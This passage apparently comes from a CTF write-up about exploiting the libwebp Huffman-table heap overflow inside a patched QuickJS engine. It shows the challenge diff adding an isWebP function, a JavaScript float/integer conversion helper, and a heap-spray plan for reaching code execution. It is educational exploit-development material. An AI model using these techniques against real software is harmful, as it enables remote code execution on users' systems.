</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="n">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="n">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="o">/*</span> <span class="n">cannot</span> <span class="n">use</span> <span class="n">getopt</span> <span class="n">because</span> <span class="n">we</span> <span class="n">want</span> <span class="n">to</span> <span class="k">pass</span> <span class="n">the</span> <span class="n">command</span> <span class="n">line</span> <span class="n">to</span>
</span></span><span class="line"><span class="cl">        <span class="n">the</span> <span class="n">script</span> <span class="o">*/</span>
</span></span><span class="line"><span class="cl">     <span class="n">optind</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">525</span><span class="p">,</span><span class="mi">7</span> <span class="o">+</span><span class="mi">527</span><span class="p">,</span><span class="mi">8</span> <span class="err">@@</span> <span class="ne">int</span> <span class="n">main</span><span class="p">(</span><span class="ne">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                 <span class="n">goto</span> <span class="n">fail</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">         <span class="p">}</span>
</span></span><span class="line"><span class="cl">         <span class="k">if</span> <span class="p">(</span><span class="n">interactive</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span>            <span class="n">js_std_eval_binary</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">qjsc_repl</span><span class="p">,</span> <span class="n">qjsc_repl_size</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>            <span class="o">//</span> <span class="n">js_std_eval_binary</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">qjsc_repl</span><span class="p">,</span> <span class="n">qjsc_repl_size</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">         <span class="p">}</span>
</span></span><span class="line"><span class="cl">         <span class="n">js_std_loop</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">diff</span> <span class="o">--</span><span class="n">git</span> <span class="n">a</span><span class="o">/</span><span class="n">qjsc</span><span class="o">.</span><span class="n">c</span> <span class="n">b</span><span class="o">/</span><span class="n">qjsc</span><span class="o">.</span><span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="n">index</span> <span class="n">f8e60b3</span><span class="o">..</span><span class="mi">23</span><span class="n">b9b00</span> <span class="mi">100644</span>
</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="n">a</span><span class="o">/</span><span class="n">qjsc</span><span class="o">.</span><span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="o">+++</span> <span class="n">b</span><span class="o">/</span><span class="n">qjsc</span><span class="o">.</span><span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">509</span><span class="p">,</span><span class="mi">8</span> <span class="o">+</span><span class="mi">509</span><span class="p">,</span><span class="mi">8</span> <span class="err">@@</span> <span class="ne">int</span> <span class="n">main</span><span class="p">(</span><span class="ne">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">     <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dynamic_module_list</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">dynamic_module_list</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">     
</span></span><span class="line"><span class="cl">     <span class="o">/*</span> <span class="n">add</span> <span class="n">system</span> <span class="n">modules</span> <span class="o">*/</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span>    <span class="n">namelist_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cmodule_list</span><span class="p">,</span> <span class="s2">&#34;std&#34;</span><span class="p">,</span> <span class="s2">&#34;std&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span>    <span class="n">namelist_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cmodule_list</span><span class="p">,</span> <span class="s2">&#34;os&#34;</span><span class="p">,</span> <span class="s2">&#34;os&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="o">//</span> <span class="n">namelist_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cmodule_list</span><span class="p">,</span> <span class="s2">&#34;std&#34;</span><span class="p">,</span> <span class="s2">&#34;std&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="o">//</span> <span class="n">namelist_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cmodule_list</span><span class="p">,</span> <span class="s2">&#34;os&#34;</span><span class="p">,</span> <span class="s2">&#34;os&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">     <span class="k">for</span><span class="p">(;;)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">         <span class="n">c</span> <span class="o">=</span> <span class="n">getopt</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="s2">&#34;ho:cN:f:mxevM:p:S:D:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">diff</span> <span class="o">--</span><span class="n">git</span> <span class="n">a</span><span class="o">/</span><span class="n">quickjs</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">c</span> <span class="n">b</span><span class="o">/</span><span class="n">quickjs</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="n">index</span> <span class="n">d99bbf4</span><span class="o">..</span><span class="mi">923</span><span class="n">dae4</span> <span class="mi">100644</span>
</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="n">a</span><span class="o">/</span><span class="n">quickjs</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="o">+++</span> <span class="n">b</span><span class="o">/</span><span class="n">quickjs</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">3783</span><span class="p">,</span><span class="mi">8</span> <span class="o">+</span><span class="mi">3783</span><span class="p">,</span><span class="mi">8</span> <span class="err">@@</span> <span class="n">void</span> <span class="n">js_std_add_helpers</span><span class="p">(</span><span class="n">JSContext</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="ne">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">     
</span></span><span class="line"><span class="cl">     <span class="n">JS_SetPropertyStr</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">global_obj</span><span class="p">,</span> <span class="s2">&#34;print&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                       <span class="n">JS_NewCFunction</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">js_print</span><span class="p">,</span> <span class="s2">&#34;print&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span>    <span class="n">JS_SetPropertyStr</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">global_obj</span><span class="p">,</span> <span class="s2">&#34;__loadScript&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span>                      <span class="n">JS_NewCFunction</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">js_loadScript</span><span class="p">,</span> <span class="s2">&#34;__loadScript&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="o">//</span> <span class="n">JS_SetPropertyStr</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">global_obj</span><span class="p">,</span> <span class="s2">&#34;__loadScript&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>                      <span class="o">//</span> <span class="n">JS_NewCFunction</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">js_loadScript</span><span class="p">,</span> <span class="s2">&#34;__loadScript&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">     
</span></span><span class="line"><span class="cl">     <span class="n">JS_FreeValue</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">global_obj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">diff</span> <span class="o">--</span><span class="n">git</span> <span class="n">a</span><span class="o">/</span><span class="n">quickjs</span><span class="o">.</span><span class="n">c</span> <span class="n">b</span><span class="o">/</span><span class="n">quickjs</span><span class="o">.</span><span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="n">index</span> <span class="mi">719</span><span class="n">fde1</span><span class="o">..</span><span class="mi">80</span><span class="n">ee90f</span> <span class="mi">100644</span>
</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="n">a</span><span class="o">/</span><span class="n">quickjs</span><span class="o">.</span><span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="o">+++</span> <span class="n">b</span><span class="o">/</span><span class="n">quickjs</span><span class="o">.</span><span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">32</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">32</span><span class="p">,</span><span class="mi">7</span> <span class="err">@@</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#include &lt;time.h&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#include &lt;fenv.h&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#include &lt;math.h&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="c1">#include &lt;webpdec.h&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#if defined(__APPLE__)</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#include &lt;malloc/malloc.h&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#elif defined(__linux__)</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">48858</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">48859</span><span class="p">,</span><span class="mi">60</span> <span class="err">@@</span> <span class="k">static</span> <span class="n">JSValue</span> <span class="n">js_global_unescape</span><span class="p">(</span><span class="n">JSContext</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="n">JSValueConst</span> <span class="n">this_val</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">     <span class="k">return</span> <span class="n">string_buffer_end</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="k">static</span> <span class="n">JSValue</span> <span class="n">js_global_isWebP</span><span class="p">(</span><span class="n">JSContext</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="n">JSValueConst</span> <span class="n">this_val</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>                                  <span class="ne">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">JSValueConst</span> <span class="o">*</span><span class="n">argv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">JSObject</span> <span class="o">*</span><span class="n">tarray</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">JSValue</span> <span class="n">obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">uint8_t</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">size_t</span> <span class="n">buflen</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">WebPBitstreamFeatures</span> <span class="o">*</span><span class="n">bitstream</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">WebPDecoderConfig</span> <span class="n">config</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">VP8StatusCode</span> <span class="n">status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">1</span> <span class="o">||</span> <span class="n">JS_VALUE_GET_TAG</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">!=</span> <span class="n">JS_TAG_OBJECT</span><span class="p">){</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="k">return</span> <span class="n">JS_UNDEFINED</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">obj</span> <span class="o">=</span> <span class="n">JS_ToObject</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">tarray</span> <span class="o">=</span> <span class="n">JS_VALUE_GET_OBJ</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="k">if</span><span class="p">(</span><span class="n">tarray</span><span class="o">-&gt;</span><span class="n">class_id</span> <span class="o">!=</span> <span class="n">JS_CLASS_UINT8_ARRAY</span><span class="p">){</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="n">JS_FreeValue</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">obj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="k">return</span> <span class="n">JS_UNDEFINED</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">buflen</span> <span class="o">=</span> <span class="n">tarray</span><span class="o">-&gt;</span><span class="n">u</span><span class="o">.</span><span class="n">array</span><span class="o">.</span><span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">buf</span> <span class="o">=</span> <span class="n">tarray</span><span class="o">-&gt;</span><span class="n">u</span><span class="o">.</span><span class="n">array</span><span class="o">.</span><span class="n">u</span><span class="o">.</span><span class="n">uint8_ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">WebPInitDecoderConfig</span><span class="p">(</span><span class="o">&amp;</span><span class="n">config</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="n">JS_FreeValue</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">obj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="k">return</span> <span class="n">JS_UNDEFINED</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">bitstream</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">config</span><span class="o">.</span><span class="n">input</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">status</span> <span class="o">=</span> <span class="n">WebPGetFeatures</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">buflen</span><span class="p">,</span> <span class="n">bitstream</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="o">!=</span> <span class="n">VP8_STATUS_OK</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="n">JS_FreeValue</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">obj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="k">return</span> <span class="n">JS_UNDEFINED</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">config</span><span class="o">.</span><span class="n">output</span><span class="o">.</span><span class="n">colorspace</span> <span class="o">=</span> <span class="n">bitstream</span><span class="o">-&gt;</span><span class="n">has_alpha</span> <span class="err">?</span> <span class="n">MODE_RGBA</span> <span class="p">:</span> <span class="n">MODE_RGB</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">status</span> <span class="o">=</span> <span class="n">DecodeWebP</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">buflen</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">config</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">WebPFreeDecBuffer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">config</span><span class="o">.</span><span class="n">output</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">JS_FreeValue</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">obj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="k">if</span><span class="p">(</span><span class="n">status</span> <span class="o">==</span> <span class="n">VP8_STATUS_OK</span><span class="p">){</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="k">return</span> <span class="n">JS_NewBool</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="k">return</span> <span class="n">JS_NewBool</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="k">static</span> <span class="n">JSValue</span> <span class="n">js_gc</span><span class="p">(</span><span class="n">JSContext</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="n">JSValueConst</span> <span class="n">this_val</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>                         <span class="ne">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">JSValueConst</span> <span class="o">*</span><span class="n">argv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">JS_RunGC</span><span class="p">(</span><span class="n">JS_GetRuntime</span><span class="p">(</span><span class="n">ctx</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="k">return</span> <span class="n">JS_UNDEFINED</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="o">/*</span> <span class="n">global</span> <span class="n">object</span> <span class="o">*/</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> <span class="k">static</span> <span class="k">const</span> <span class="n">JSCFunctionListEntry</span> <span class="n">js_global_funcs</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">48865</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">48920</span><span class="p">,</span><span class="mi">8</span> <span class="err">@@</span> <span class="k">static</span> <span class="k">const</span> <span class="n">JSCFunctionListEntry</span> <span class="n">js_global_funcs</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="n">JS_CFUNC_DEF</span><span class="p">(</span><span class="s2">&#34;parseFloat&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">js_parseFloat</span> <span class="p">),</span>
</span></span><span class="line"><span class="cl">     <span class="n">JS_CFUNC_DEF</span><span class="p">(</span><span class="s2">&#34;isNaN&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">js_global_isNaN</span> <span class="p">),</span>
</span></span><span class="line"><span class="cl">     <span class="n">JS_CFUNC_DEF</span><span class="p">(</span><span class="s2">&#34;isFinite&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">js_global_isFinite</span> <span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">JS_CFUNC_DEF</span><span class="p">(</span><span class="s2">&#34;isWebP&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">js_global_isWebP</span> <span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">JS_CFUNC_DEF</span><span class="p">(</span><span class="s2">&#34;gc&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">js_gc</span> <span class="p">),</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">     <span class="n">JS_CFUNC_MAGIC_DEF</span><span class="p">(</span><span class="s2">&#34;decodeURI&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">js_global_decodeURI</span><span class="p">,</span> <span class="mi">0</span> <span class="p">),</span>
</span></span><span class="line"><span class="cl">     <span class="n">JS_CFUNC_MAGIC_DEF</span><span class="p">(</span><span class="s2">&#34;decodeURIComponent&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">js_global_decodeURI</span><span class="p">,</span> <span class="mi">1</span> <span class="p">),</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The key aspect of the patches is the introduction of a new function named <code>isWebP</code>. This function accepts a <code>Uint8Array</code> representing a WebP image stream and attempts to decode the image. The version of <code>libwebp</code> in use is the vulnerable one, therefore, invoking this <code>isWebP</code> function with the malicious image will trigger the heap overflow bug.</p>
<p>Given that the malicious image is already available online, the primary challenge is to craft an exploit that leverages the heap overflow bug to trigger Remote Code Execution (RCE). This is crucial because to retrieve the flag, we must execute the command <code>/readflag</code>.</p>
<h3 id="solution">Solution</h3>
<h4 id="testing-the-heap-overflow">Testing the heap overflow</h4>
<p>First, let&rsquo;s set up our helper.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// Helper taken from https://changochen.github.io/2019-04-29-starctf-2019.html
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">f64</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">u32</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">f64</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">d2u</span><span class="p">(</span><span class="nx">v</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">v</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">u32</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">u2d</span><span class="p">(</span><span class="nx">lo</span><span class="p">,</span> <span class="nx">hi</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">u32</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">u32</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">hi</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">lo</span><span class="p">,</span> <span class="nx">hi</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nx">lo</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="nx">hi</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;00000000&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nx">hi</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="nx">lo</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="p">(</span><span class="s1">&#39;00000000&#39;</span><span class="o">+</span><span class="nx">hi</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)).</span><span class="nx">substr</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span><span class="p">(</span><span class="s1">&#39;00000000&#39;</span><span class="o">+</span><span class="nx">lo</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)).</span><span class="nx">substr</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Upon reviewing the information in the <a href="https://www.darknavy.org/blog/exploiting_the_libwebp_vulnerability_part_1/" target="_blank" rel="noopener noreffer ">POC&rsquo;s blog</a>, we learn that the POC&rsquo;s malicious image aims to overwrite <code>chunk+0x3000</code>. Let&rsquo;s try to check what kind of overflow that it can trigger in the <code>gdb</code>. My approach to check about it is:</p>
<ul>
<li>Spray numerous pair of (<code>ArrayBuffer</code> with a size of <code>0x2f28</code> and <code>Array</code> with size <code>0x1</code>).</li>
<li>Free some of these <code>ArrayBuffer</code> objects.</li>
<li>Attempt to allocate the Huffman table, hoping it occupies one of the freed <code>ArrayBuffer</code> chunks due to the same size.</li>
<li>Inspect the value at <code>chunk+0x3000</code> to analyze the effects of the overflow.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
